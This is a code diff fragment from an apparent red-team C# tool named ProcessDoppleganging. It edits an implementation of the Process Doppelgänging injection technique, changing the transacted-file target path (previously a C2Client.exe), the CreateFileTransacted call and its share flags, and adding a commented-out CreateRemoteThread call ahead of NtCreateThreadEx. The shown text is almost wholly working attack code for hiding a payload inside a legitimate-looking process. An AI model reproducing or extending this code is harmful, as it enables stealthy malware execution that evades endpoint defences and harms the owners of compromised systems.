@@ -29,16 +29,16 @@ namespace ProcessDoppleganging
             Console.WriteLine(Marshal.GetLastWin32Error());
             Console.WriteLine(thandle);
 
-            string exe_path = @"D:\red teaming tools\C2Client.exe";
+            string exe_path = @"C:\Windows\temp\temp.exe";
            string payload_path = @"D:\red teaming tools\calc2.exe";
 
-            //string exe_path = args[0];
+           // string exe_path = args[0];
            // string payload_path = args[1];
 
-            IntPtr filehandle =CreateFileTransactedW(
+            IntPtr filehandle =CreateFileTransactedA(
                 exe_path,
                 0x40000000| 0x80000000,
-                0x00000002,
+                0x00000002| 0x00000001,
                 IntPtr.Zero,
                 2,
                 0x80,
@@ -228,11 +228,21 @@ namespace ProcessDoppleganging
 
 
 
-            
 
 
-           
+
+
             // Console.WriteLine(threadid);
+            uint threadid2 = 0;
+            /*threadhandle = CreateRemoteThread(
+                prochandle,
+                IntPtr.Zero,
+                0,
+                (IntPtr)(remotebase + 0x4000),
+                IntPtr.Zero,
+                0,
+                ref threadid2
+                );*/
 
 
             int res= NtCreateThreadEx(
